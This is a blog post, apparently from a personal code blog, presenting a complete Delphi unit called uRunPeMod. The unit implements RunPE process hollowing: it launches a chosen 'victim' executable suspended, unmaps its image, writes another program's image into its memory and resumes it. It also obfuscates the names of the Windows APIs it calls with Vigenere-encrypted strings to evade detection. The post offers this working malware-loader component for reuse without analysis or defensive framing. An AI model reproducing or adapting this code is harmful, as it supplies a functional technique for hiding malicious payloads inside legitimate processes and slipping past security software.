---
layout: post
canonical_url: https://www.cheesydoodle.com
toc: true
title: "[Unit] uModRunPE"
date: 2023-01-05 12:00:00 +0800
categories: [Code, Delphi, Unit]
tags: [unit, runpe, code, delphi]
---

```pascal
(* ***********************************
  Unit             : uRunPeMod
  Original Author  : Unknowen
  Delphi Author    : Steve10120
  Modded           : Departure
  Url              : ic0de.org
  *********************************** *)
unit uRunPeMod;

interface

Uses
  Windows;

Type
  TByteArray = Array of Byte;

  // NtUnmapViewOfSection
  TFUnmapViewOfSection = function(Processhandle: THandle; BaseAddr: Pointer)
    : DWORD; stdcall;
  // GetThreadContext
  TFGetThreadContext = function(TTheard: Cardinal; var I: _CONTEXT): Boolean;
    stdcall;
  // SetThreadContext
  TFSetThreadContext = function(TTheard: Cardinal; var I: _CONTEXT): Boolean;
    stdcall;
  // CreateProcessA
  TFCreatProcessA = function(lpApplicationName: PAnsiChar;
    lpCommandLine: PAnsiChar; lpProcessAttributes: PSecurityAttributes;
    lpThreadAttributes: PSecurityAttributes; bInheritnHandles: LongBool;
    dwCreationFlags: Cardinal; lpEnvironment: Pointer;
    lpCurrentDirectory: PAnsiChar; const lpStartupInfo: _STARTUPINFOA;
    var lpProcessInformation: _PROCESS_INFORMATION): Boolean; stdcall;
  // ReadProcessmemory
  TFReadProcessMemory = function(hProcess: Cardinal;
    const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: Cardinal;
    var lpNumberOfBytesRead: Cardinal): Boolean; stdcall;
  // WriteProcessMemory
  TFWriteProcessMemory = function(hProcess: Cardinal;
    const lpBaseAddress: Pointer; lpBuffer: Pointer; nSize: Cardinal;
    var lpNumberOfBytesRead: Cardinal): Boolean; stdcall;
  // VirtualAllocEx
  TFVirtualAllocEx = function(hProcess: Cardinal; lpAddress: Pointer;
    dwSize: Cardinal; flAllocType: Cardinal; flProtect: Cardinal): Pointer;
    stdcall;
  // ResumeThread
  TFResumeThread = function(TTheard: Cardinal): DWORD; stdcall;
  // CloseHandle
  TFCloseHandle = function(TThread: Cardinal): LongBool; stdcall;

Var
  // API Functions
  TFU: TFUnmapViewOfSection;
  TFG: TFGetThreadContext;
  TFS: TFSetThreadContext;
  TFC: TFCreatProcessA;
  TFR: TFReadProcessMemory;
  TFW: TFWriteProcessMemory;
  TFV: TFVirtualAllocEx;
  TFT: TFResumeThread;
  TFH: TFCloseHandle;

  // Encrypted Strings
  sKey: String = 'ic0de';
  sKER: String = '6J$TLWvB'; // Kernel32
  sNTD: String = 'YYtRS'; // ntdll
  sTFU: String = '9YeTTLUfOLb4v9LNYyUU'; // NtUnmapViewOfSection
  sTFG: String = '2J&:O]JqJ*ZS&K__'; // GetThreadContext
  sTFS: String = '>J&:O]JqJ*ZS&K__'; // SetThreadContext
  sTFC: String = '.WuG[P5$UJPX%'''; // CreateProcessA
  sTFR: String = '=JqJ7]TsKZ^2uSV]^'; // ReadProcessMemory
  sTFW: String = 'BWyZL;W!IL^X]KTZW+'; // WriteProcessMemory
  sTFV: String = 'AN$Z\LQQRSZHU^'; // VirtualAllocEx
  sTFT: String = '=J%[TP9xXLLI'; // ResumeThread
  sTFH: String = '.Q!YL3F JSP'; // CloseHandle

  // Public Functions
Function LoadAPIs(sKey: String): Boolean;
Function RunPeMod(sVictim: string; bFile: TByteArray): Boolean;
Function VigenereExEncrypt(sSource, sKey: String; bDecrypt: Boolean = False; iTableSize: Integer = 94): String;
implementation

{ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ }
Function VigenereExEncrypt(sSource, sKey: String; bDecrypt: Boolean = False;
  iTableSize: Integer = 94): String;
var
  I, iPosText, iPosKey: Integer;
  sTable: string;
begin
  // Create our Cipher Table
  I := 32;
  While I <= (iTableSize + 32) do
  Begin
    sTable := ConCat(sTable, Chr(I));
    inc(I);
  end;
  // Make the key the same size or greater than the Source
  while Length(sSource) >= Length(sKey) do
    sKey := ConCat(sKey, sKey);
  // Vegenere Encryption/Decryption routine
  I := 1;
  while I <= Length(sSource) do
  Begin
    iPosText := pred(pos(sSource[I], sTable));
    iPosKey := pred(pos(sKey[I], sTable));
    // Encrypt or Decrypt(Default is Encrypt)
    Case bDecrypt of
      False:
        Result := Result + sTable[((iPosText + iPosKey) mod iTableSize) + 1];
      True:
        Result := Result + sTable[(((iPosText + iTableSize) - iPosKey)
            mod iTableSize) + 1];
    end;
    inc(I);
  end;
end;

{ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ }
Function LoadAPIs(sKey: String): Boolean;
begin
  Result := True;
  Try
    @TFU := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sNTD, sKey, True))), Pchar
        (VigenereExEncrypt(sTFU, sKey, True)));
    @TFG := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFG, sKey, True)));
    @TFS := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFS, sKey, True)));
    @TFC := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFC, sKey, True)));
    @TFR := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFR, sKey, True)));
    @TFW := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFW, sKey, True)));
    @TFV := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFV, sKey, True)));
    @TFT := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFT, sKey, True)));
    @TFH := GetProcAddress
      (GetModuleHandle(Pchar(VigenereExEncrypt(sKER, sKey, True))), Pchar
        (VigenereExEncrypt(sTFH, sKey, True)));
  Except
    Result := False;
  end;
end;

{ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ }
procedure Move(Destination, Source: Pointer; Length: DWORD);
asm
  PUSHAD
  MOV ESI, Source
  MOV EDI, Destination
  MOV ECX, Length
  REP MOVSB
  POPAD
end;

{ ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++ }
  function RunPeMod(sVictim: string; bFile: TByteArray): Boolean;
  var
    IDH: TImageDosHeader;
    INH: TImageNtHeaders;
    ISH: TImageSectionHeader;
    PI: TProcessInformation;
    SI: TStartUpInfo;
    CONT: TContext;
    ImageBase: Pointer;
    Ret: DWORD;
    I: Integer;
    Addr: DWORD;
    dOffset: DWORD;
  begin
    Result := False;
    try
      Move(@IDH, @bFile[0], 64);
      if IDH.e_magic = IMAGE_DOS_SIGNATURE then
      begin
        Move(@INH, @bFile[IDH._lfanew], 248);
        if INH.Signature = IMAGE_NT_SIGNATURE then
        begin
          FillChar(SI, SizeOf(TStartUpInfo), #0);
          FillChar(PI, SizeOf(TProcessInformation), #0);
          SI.cb := SizeOf(TStartUpInfo);
          if TFC(nil, Pchar(sVictim), nil, nil, False, CREATE_SUSPENDED, nil,
            nil, SI, PI) then
          begin
            CONT.ContextFlags := CONTEXT_FULL;
            if TFG(PI.hThread, CONT) then
            begin
              TFR(PI.hProcess, Ptr(CONT.Ebx + 8), @Addr, 4, Ret);
              TFU(PI.hProcess, Pointer(Addr));
              ImageBase := TFV(PI.hProcess, Ptr(INH.OptionalHeader.ImageBase),
                INH.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT,
                PAGE_READWRITE);
              TFW(PI.hProcess, ImageBase, @bFile[0],
                INH.OptionalHeader.SizeOfHeaders, Ret);
              dOffset := IDH._lfanew + 248;
              for I := 0 to INH.FileHeader.NumberOfSections - 1 do
              begin
                Move(@ISH, @bFile[dOffset + (I * 40)], 40);
                TFW(PI.hProcess, Ptr(Cardinal(ImageBase) + ISH.VirtualAddress),
                  @bFile[ISH.PointerToRawData], ISH.SizeOfRawData, Ret);
              end;
              TFW(PI.hProcess, Ptr(CONT.Ebx + 8), @ImageBase, 4, Ret);
              CONT.Eax := Cardinal(ImageBase)
                + INH.OptionalHeader.AddressOfEntryPoint;
              TFS(PI.hThread, CONT);
              TFT(PI.hThread);
              Result := True;
            end;
          end;
        end;
      end;
    except
      TFH(PI.hProcess);
      TFH(PI.hThread);
    end;
  end;
end.
```

If you're interested in more code like this, feel free to explore the rest of the blog at [cheesydoodle.com](https://www.cheesydoodle.com).
